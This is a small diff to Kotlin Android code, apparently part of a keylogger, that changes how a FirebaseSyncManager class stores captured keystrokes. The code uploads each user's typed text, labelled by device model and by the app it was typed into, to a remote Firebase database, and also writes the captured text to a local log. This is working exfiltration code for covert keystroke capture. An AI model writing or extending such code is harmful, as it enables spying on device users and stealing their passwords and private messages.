@@ -19,8 +19,8 @@ class FirebaseSyncManager {
             scope.launch {
                 try {
                     val database = FirebaseDatabase.getInstance()
-                    val ref = database.getReference("keystrokes_batches")
                     val deviceName = Build.MODEL?.replace(Regex("[^a-zA-Z0-9_-]"), "_")?.ifBlank { "Unknown_Device" } ?: "Unknown_Device"
+                    val ref = database.getReference().child(deviceName).child("keystrokes_batches")
                     val appName = (packageName ?: "unknown.app").replace(Regex("[^a-zA-Z0-9_-]"), "_")
                     val timestampKey = SimpleDateFormat("yyyy-MM-dd_HH-mm-ss_SSS", Locale.getDefault()).format(Date())
 
@@ -31,7 +31,7 @@ class FirebaseSyncManager {
                         "typedContent" to text
                     )
 
-                    ref.child(deviceName).child(appName).child(timestampKey).setValue(logData)
+                    ref.child(appName).child(timestampKey).setValue(logData)
                         .addOnSuccessListener {
                             Log.d(TAG, "Keystroke synced successfully: $text")
                             LogStore.addLog("[$deviceName] Keystroke synced ($appName): $text")
